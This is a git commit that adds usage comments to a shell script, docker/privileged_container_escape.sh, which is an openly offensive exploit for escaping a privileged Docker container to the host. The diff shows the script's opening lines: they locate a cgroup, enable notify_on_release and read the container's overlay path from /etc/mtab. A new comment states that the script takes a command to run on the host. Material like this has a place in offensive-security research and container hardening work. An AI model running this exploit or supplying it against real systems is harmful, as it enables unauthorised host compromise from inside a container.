c0a39609929978fc3a0b3e81d28b5ba6a6dc6930
Nick Frichette <nick@frichetten.com>
2019-08-19 15:20:23 -0500

    Added some additional info to the privileged container escape

--- docker/privileged_container_escape.sh
+++ docker/privileged_container_escape.sh
@@ -1,5 +1,7 @@
 #!/bin/bash
 # Credit: https://twitter.com/_fel1x/status/1151487051986087936
+# Usage: sh escape.sh whoami
+# Add a command after ($1)
 d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
 mkdir -p $d/w;echo 1 >$d/w/notify_on_release
 t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
